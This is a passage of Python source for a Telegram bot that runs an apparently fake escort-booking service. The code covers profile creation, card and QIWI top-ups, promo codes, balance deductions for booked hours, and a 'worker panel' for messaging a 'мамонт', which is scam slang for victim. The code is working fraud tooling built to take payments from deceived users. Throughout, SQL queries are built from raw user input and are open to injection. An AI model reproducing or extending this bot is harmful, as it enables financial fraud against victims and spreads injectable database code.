			bot.send_message(call.message.chat.id, "Отправьте 1 чтобы поставить киви или 2 чтобы поставить карту")
			bot.register_next_step_handler(call.message, replaceplatejka)

		elif call.data == "smsmamont":
			bot.send_message(call.message.chat.id,
							 "Отправьте айди мамонта и Сообщение в формате id:Сообщение\n\nНапример  123456789:Ты мамонт",
							 reply_markup=cancel())
			bot.register_next_step_handler(call.message, mamontmessage)
		else:
			pass


@bot.message_handler(content_types=['photo'])
def newancet(message):
	try:
		if message.chat.id == admin:
			file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
			downloaded_file = bot.download_file(file_info.file_path)

			src = 'images/' + file_info.file_path;
			with open(src, 'wb') as new_file:
				new_file.write(downloaded_file)

			imglink = file_info.file_path

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from ancety")
			c = cur.fetchone()[0]
			con.commit()
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			nn = "a"
			mm = 0
			cur.execute(f"INSERT INTO ancety (id,mainphoto,name,cena,about,status)"
						f"VALUES ({c + 1},\"{imglink}\",\"{nn}\",{mm},\"{nn}\",{0})")
			con.commit()

			bot.send_message(message.chat.id, "Фото добавлено\n\nКак будем называть эту бабочку?🙃")
			bot.register_next_step_handler(message, nameancet)



	except Exception as e:
		bot.reply_to(message, e)


@bot.message_handler(content_types=['text'])
def nameancet(message):
	try:
		if message.chat.id == admin:
			nameb = message.text

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from ancety")
			c = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE ancety SET name = \'{nameb}\' WHERE id = {c}")
			con.commit()

			bot.send_message(message.chat.id, "Имя выбрано ✅\nВведите цену бабочки за час 💸")
			bot.register_next_step_handler(message, cenaancet)
	except Exception as e:
		bot.reply_to(message, e)
		bot.register_next_step_handler(message, nameancet)


@bot.message_handler(content_types=['text'])
def cenaancet(message):
	try:
		if message.chat.id == admin:
			if message.text.isdigit():
				cenna = int(message.text)
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from ancety")
				c = cur.fetchone()[0]
				con.commit()
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE ancety SET cena = {cenna} WHERE id = {c}")
				con.commit()

				bot.send_message(message.chat.id, "Цена выбрана ✅\nВведите услуги девушки")
				bot.register_next_step_handler(message, uslugiancet)

			else:
				bot.send_message(message.chat.id, "Введите число")
				bot.register_next_step_handler(message, cenaancet)


	except Exception as e:
		bot.reply_to(message, e)
		bot.register_next_step_handler(message, cenaancet)


@bot.message_handler(content_types=['text'])
def uslugiancet(message):
	try:

		if message.chat.id == admin:
			uslu = message.text
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from ancety")
			c = cur.fetchone()[0]
			con.commit()
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE ancety SET about = \'{uslu}\' WHERE id = {c}")
			con.commit()

			ak = types.InlineKeyboardMarkup()
			ak1 = types.InlineKeyboardButton(text="Включить", callback_data="vkl")
			ak2 = types.InlineKeyboardButton(text="Удалить", callback_data="otkl")

			ak.add(ak1)
			ak.add(ak2)

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select mainphoto from ancety where id = {c}")
			img = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select name from ancety where id = {c}")
			aname = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select cena from ancety where id = {c}")
			acena = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select about from ancety where id = {c}")
			aabout = cur.fetchone()[0]
			con.commit()

			texttext = f"🦋 Имя: {aname}\n\n💰Цена за час: {acena}\n\n❗️ Описание: {aabout}"

			imglink = f"images/{img}"
			photo = open(imglink, 'rb')
			bot.send_photo(message.chat.id, photo, caption=texttext)

			bot.send_message(message.chat.id, "Анкета готова !\nВключить данную анкету ?", reply_markup=ak)

			bot.register_next_step_handler(message, main_message)





	except Exception as e:
		bot.reply_to(message, e)
		bot.register_next_step_handler(message, uslugiancet)


@bot.message_handler(content_types=['text'])
def otklancete(message):
	try:
		nomer = message.text
		if message.text == b20:
			bot.send_message(message.chat.id, "Отменено", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)
		else:

			if nomer.isdigit():
				try:
					if message.chat.id == admin:
						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select count(*) from ancety where id = {nomer}")
						if cur.fetchone()[0] == 1:
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"UPDATE ancety SET status = {0} WHERE id ={nomer}")
							con.commit()
							bot.send_message(message.chat.id, "Анкета отключена", reply_markup=userpanel())
							bot.register_next_step_handler(message, main_message)




					else:
						bot.send_message(message.chat.id, "Анкета не найдена\nВведите правильный номер анкеты")
						bot.register_next_step_handler(message, otklancete)




				except Exception as e:
					bot.reply_to(message, e)
					bot.register_next_step_handler(message, otklancet)

			else:
				bot.send_message(message.chat.id, "Введите число")
				bot.register_next_step_handler(message, otklancet)

	except Exception as e:
		bot.reply_to(message, e)
		bot.register_next_step_handler(message, otklancet)


@bot.message_handler(content_types=['text'])
def create_promo(message):
	try:
		if message.text.isdigit():
			summ = int(message.text)
			if summ > maxpromo:
				bot.send_message(message.chat.id, f"Максимальная сумма промокода {maxpromo}")
				bot.register_next_step_handler(message, create_promo)
			elif summ <= 0:
				bot.send_message(message.chat.id, f"Сумма должна быть больше 0")
				bot.register_next_step_handler(message, create_promo)
			else:
				letters = string.ascii_letters
				codecode = (''.join(random.choice(letters) for i in range(10)))
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"INSERT INTO promocode (summa,code)"
							f"VALUES ({summ},\'{codecode}\')")
				con.commit()
				bot.send_message(message.chat.id,
								 f"Промокод добавлен !\n\n`{codecode}`\n\nНажмите на промокод чтобы скопировать",
								 parse_mode='Markdown')
				bot.register_next_step_handler(message, main_message)


		else:
			bot.send_message(message.chat.id, "Введите число")

	except Exception as e:
		bot.reply_to(message, e)
		bot.register_next_step_handler(message, create_promo)


@bot.message_handler(content_types=['text'])
def promo(message):
	try:
		testpromo = message.text
		if testpromo == b20:
			bot.send_message(message.chat.id, "Отменено", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)

		else:

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from promocode where code = \'{testpromo}\'")

			r = cur.fetchone()[0]

			con.commit()

			if r == 0:

				bot.send_message(message.chat.id,
								 "Промокод неправильный или уже использовался\n\nНапишите новый промокод.")
				bot.register_next_step_handler(message, promo)
			else:

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select summa from promocode where code = \'{testpromo}\'")
				summpromo = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE  from promocode where code = \'{testpromo}\'")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select balance from users where id = {message.chat.id}")
				balancenow = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE users SET balance = {balancenow + summpromo} WHERE id = {message.chat.id}")
				con.commit()

				bot.send_message(message.chat.id,
								 f"✅ Ваш баланс пополнен на {summpromo}₽\n\n💰 Баланс {balancenow + summpromo}₽",
								 reply_markup=userpanel())
				bot.register_next_step_handler(message, main_message)



	except Exception as e:
		pass


@bot.message_handler(content_types=['text'])
def balik(message):
	if message.text == b12:
		bot.send_message(message.chat.id, "ℹ️ Введите сумму пополнения", reply_markup=cancel())
		bot.register_next_step_handler(message, popolni)

	elif message.text == b20:
		bot.send_message(message.chat.id, "🏠 Вы вернулись в главное меню", reply_markup=userpanel())
		bot.register_next_step_handler(message, main_message)


@bot.message_handler(content_types=['text'])
def popolni(message):
	if message.text == b20:
		bot.send_message(message.chat.id, "🏠 Вы вернулись в главное меню", reply_markup=userpanel())
		bot.register_next_step_handler(message, main_message)
	else:

		if message.text.isdigit():
			skolko = int(message.text)
			if skolko >= minimalka and skolko <= maximalka:

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select number from sposobaoplaty")
				spso = cur.fetchone()[0]
				con.commit()

				if spso == 1:

					try:
						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"DELETE FROM oplata WHERE id = {message.chat.id}")
						con.commit()
					except Exception as e:
						raise

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					comment = randint(10000, 9999999)
					cur.execute(f"INSERT INTO oplata (id, code) VALUES({message.chat.id}, {comment})")
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select num from qiwi")
					qiwinumber = cur.fetchone()[0]
					con.commit()

					texttt = f'💳 Оплата осуществляется: Через администратора'
					link = f"Линк на тех поддержку"
					markup_inline = types.InlineKeyboardMarkup()
					pereyti = types.InlineKeyboardButton(text="➡️ Связаться администратором", callback_data="site", url=link)
					proverka = types.InlineKeyboardButton(text='✅ Я оплатил', callback_data='prov')
					markup_inline.add(pereyti)

					bot.send_message(message.from_user.id, texttt, parse_mode='Markdown', reply_markup=markup_inline)
					bot.register_next_step_handler(message, main_message)
				else:
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"DELETE from oplatac where id = {message.chat.id}")

					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()

					cur.execute(f"INSERT INTO oplatac (id,summ) VALUES({message.chat.id},{skolko})")
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select num from card")
					cardnumber = cur.fetchone()[0]
					con.commit()

					texttt = f'💸 Переведите {skolko}₽ на карту\n\n💳 Номер: `{cardnumber}`\n\n_Нажмите на номер, чтобы скопировать_'

					markup_inline = types.InlineKeyboardMarkup()

					proverka = types.InlineKeyboardButton(text='Проверить оплату', callback_data='prov')

					markup_inline.add(proverka)

					bot.send_message(message.from_user.id, texttt, parse_mode='Markdown', reply_markup=markup_inline)
					bot.register_next_step_handler(message, main_message)

			else:
				bot.send_message(message.chat.id, f"Сумма пополнения должна быть от {minimalka} до {maximalka}")
				bot.register_next_step_handler(message, popolni)

		else:
			bot.send_message(message.chat.id, "Напишите число")
			bot.register_next_step_handler(message, popolni)


@bot.message_handler(content_types=['text'])
def replaceqiwi(message):
	try:
		newqiwi = message.text

		if newqiwi == b20:
			bot.send_message(message.from_user.id, f"Отменено", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)
		else:
			if message.chat.id == admin:
				q = newqiwi.split(":")
				nq = int(q[0])
				tq = q[1]

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE qiwi SET num = {nq}")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE qiwi SET token = \'{tq}\'")
				con.commit()

				bot.send_message(message.from_user.id, f"Данные киви изменены\n\nНовый номер: {nq}\nНовы токен: {tq}",
								 reply_markup=userpanel())
				bot.register_next_step_handler(message, main_message)



	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def rass(message):
	if message.chat.id == admin:

		if message.text == b20:
			bot.send_message(message.from_user.id, "Рассылка отменена", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)

		else:
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			bot.send_message(message.from_user.id, "Рассылка успешно начата")
			cur.execute("SELECT id FROM users")
			id = cur.fetchall()
			for i in id:
				try:
					bot.send_message(i[0], f"{message.text}")
					time.sleep(0.1)
				except:
					pass
			bot.send_message(message.from_user.id, "Рассылка успешно завершена", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)


@bot.message_handler(content_types=['text'])
def chas(message):
	try:
		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"select photoid from users where id = {message.chat.id}")
		vi = cur.fetchone()[0]
		con.commit()

		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"select balance from users where id = {message.chat.id}")
		bnow = cur.fetchone()[0]
		con.commit()

		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"select cena from ancety where id = {vi}")
		op = cur.fetchone()[0]
		con.commit()

		skch = message.text
		if message.text == b20:
			bot.send_message(message.from_user.id, "Отменено.", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)
		else:

			if skch.isdigit():
				if int(skch) >= 0 and int(skch) <= 24:
					if int(skch) % 1 == 0:
						if int(skch) >= 2:
							op = op + (int(skch) * op) / 2

						if op > bnow:
							bot.send_message(message.from_user.id,
											 f"❗️ На вашем счете недостаточно средств.\nСумма заказа: {op}₽\nНа балансе {bnow}₽",
											 reply_markup=bal())
							bot.register_next_step_handler(message, balik)
						else:
							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"UPDATE users SET balance = {bnow - op} WHERE id = {message.chat.id}")
							con.commit()

							keyboard = types.InlineKeyboardMarkup()
							button = types.InlineKeyboardButton(text="✉️ Связаться с администратором", url="Линк на тех поддержку")
							keyboard.add(button)

							bot.send_message(message.from_user.id,
                							f"✅ Вы успешно сделали заказ\n\nℹ️ Средства списаны с вашего кошелька. Свяжитесь с администратором салона для дальнейшего развития событий.\nПриятного отдыха!",
                							reply_markup=keyboard)

							bot.register_next_step_handler(message, main_message)




					else:
						bot.send_message(message.from_user.id, "Введите целое число.")
						bot.register_next_step_handler(message, chas)

				else:
					bot.send_message(message.from_user.id, "Введите число от 1 до 24.")
					bot.register_next_step_handler(message, chas)

			else:
				bot.send_message(message.from_user.id, "Введите число.")
				bot.register_next_step_handler(message, chas)

	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def addp(message):
	if message.text == b20:
		bot.send_message(message.from_user.id, "Отменено", reply_markup=userpanel())
		bot.register_next_step_handler(message, main_message)
	else:
		try:
			if message.chat.id == admin:

				if message.text.isdigit():
					nnn = int(message.text)
					try:
						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select count(*) from ancety where id = {nnn}")
						addcount = cur.fetchone()[0]
						con.commit()
						if addcount == 0:
							bot.send_message(message.from_user.id, "Анкета не найдена\nНапишите правильный номер")
							bot.register_next_step_handler(message, addp)
						else:
							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select count(*) from photos")
							countphotos = cur.fetchone()[0]
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"select mainphoto from ancety where id = {nnn}")
							mphoto = cur.fetchone()[0]
							con.commit()

							con = sqlite3.connect("data.db")
							cur = con.cursor()
							cur.execute(f"INSERT INTO photos (id,anceta,image)"
										f"VALUES ({countphotos + 1},{nnn},\'{mphoto}\')")

							con.commit()
							bot.send_message(message.from_user.id, "Отправьте фото.")
							bot.register_next_step_handler(message, addimage)


					except Exception as e:
						raise



				else:
					bot.send_message(message.from_user.id, "Напишите число")
					bot.register_next_step_handler(message, addp)
		except Exception as e:
			raise


@bot.message_handler(content_types=['photo'])
def addimage(message):
	try:
		if message.chat.id == admin:
			file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
			downloaded_file = bot.download_file(file_info.file_path)

			src = 'images/' + file_info.file_path;
			with open(src, 'wb') as new_file:
				new_file.write(downloaded_file)

			imagelink = file_info.file_path

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from photos")
			countphotos = cur.fetchone()[0]
			con.commit()

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE photos SET image = \'{imagelink}\' WHERE id = {countphotos}")
			con.commit()

			bot.send_message(message.from_user.id, "Фото добавлено.", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)





	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def prinyatieplateja(message):
	try:
		if message.text == b20:
			bot.send_message(message.chat.id, "Отменено")
			bot.register_next_step_handler(message, main_message)
		else:

			if message.text.isdigit():

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from oplatac where id = {int(message.text)}")
				inn = cur.fetchone()[0]
				con.commit()

				if inn == 0:
					bot.send_message(message.chat.id, "ID Платежа не найден\nНапишите правильный айди")
					bot.register_next_step_handler(message, prinyatieplateja)
				else:

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select summ from oplatac where id = {int(message.text)}")
					isumm = cur.fetchone()[0]
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select balance from users where id = {int(message.text)}")
					ibn = cur.fetchone()[0]
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE users SET balance = {ibn + isumm} where id = {int(message.text)}")

					con.commit()

					bot.send_message(int(message.text), "✅ Ваш баланс пополнен", reply_markup=userpanel())
					bot.send_message(message.chat.id, "Готово!")
					bot.register_next_step_handler(message, main_message)

			else:
				bot.send_message(message.chat.id, "Напишите число")
				bot.register_next_step_handler(message, prinyatieplateja)






	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def otklonplateja(message):
	try:

		if message.text == b20:
			bot.send_message(message.chat.id, "Отменено")
			bot.register_next_step_handler(message, main_message)
		else:
			if message.text.isdigit():

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from oplatac where id = {int(message.text)}")
				inn = cur.fetchone()[0]
				con.commit()

				if inn == 0:
					bot.send_message(message.chat.id, "ID Платежа не найден\nНапишите правильный айди")
					bot.register_next_step_handler(message, otklonplateja)
				else:

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select id from oplatac where id = {int(message.text)}")
					i = cur.fetchone()[0]
					con.commit()

					bot.send_message(i, "Ваш Платеж не найден !")
					bot.send_message(message.chat.id, "Готово!", reply_markup=userpanel())
					bot.register_next_step_handler(message, main_message)
			else:
				bot.send_message(message.chat.id, "Напишите число")
				bot.register_next_step_handler(message, otklonplateja)
	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def replacecard(message):
	try:
		newqiwi = message.text

		if newqiwi == b20:
			bot.send_message(message.from_user.id, f"Отменено", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)
		else:

			if (message.text.isdigit()):

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE card SET num = {int(message.text)}")
				con.commit()

				bot.send_message(message.chat.id, f"Данные изменены", reply_markup=userpanel())
				bot.register_next_step_handler(message, main_message)

			else:
				bot.send_message(message.from_user.id, f"Напишите число")
				bot.register_next_step_handler(message, replaceqiwi)






	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def replaceplatejka(message):
	try:
		if (message.text.isdigit()):

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE sposobaoplaty SET number = {int(message.text)}")
			con.commit()

			bot.send_message(message.chat.id, f"Данные изменены", reply_markup=userpanel())
			bot.register_next_step_handler(message, main_message)

		else:
			bot.send_message(message.from_user.id, f"Напишите число")
			bot.register_next_step_handler(message, replaceplatejka)

	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def mamontmessage(message):
	wrk = types.InlineKeyboardMarkup()
	wrk1 = types.InlineKeyboardButton(text=b8, callback_data="ref")
	wrk5 = types.InlineKeyboardButton(text="Сообщение мамонту", callback_data="smsmamont")
	wrk2 = types.InlineKeyboardButton(text=b18, callback_data="prom")
	wrk4 = types.InlineKeyboardButton(text=b5, callback_data="statw")
	wrk3 = types.InlineKeyboardButton(text=b11, callback_data="menu")

	wrk.add(wrk1)
	wrk.add(wrk5)
	wrk.add(wrk2)
	wrk.add(wrk4)
	wrk.add(wrk3)
	try:
		if ":" in message.text:

			m = message.text.split(":")

			if m[0].isdigit():
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from users where id = {m[0]}")
				est = cur.fetchone()[0]
				con.commit()
				if est == 0:
					bot.send_message(message.chat.id, f"Пользователь не найден в базе")
					bot.register_next_step_handler(message, mamontmessage)
				else:

					bot.send_message(m[0], m[1])
					bot.send_message(message.chat.id, f"Сообщение отправлено", reply_markup=userpanel())
					bot.send_message(message.chat.id, f"Воркер панель⚙️", reply_markup=wrk)
					bot.register_next_step_handler(message, main_message)
			else:
				bot.send_message(message.chat.id, f"Неправильный формат данных")
				bot.register_next_step_handler(message, mamontmessage)
		elif message.text == b20:
			bot.send_message(message.chat.id, f"Отменено", reply_markup=userpanel())
			bot.send_message(message.chat.id, f"Воркер панель⚙️", reply_markup=wrk)
			bot.register_next_step_handler(message, main_message)

		else:
			bot.send_message(message.chat.id, f"Неправильный формат данных")
			bot.register_next_step_handler(message, mamontmessage)

	except Exception as e:
		raise


if __name__ == '__main__':
	bot.polling(none_stop=True)
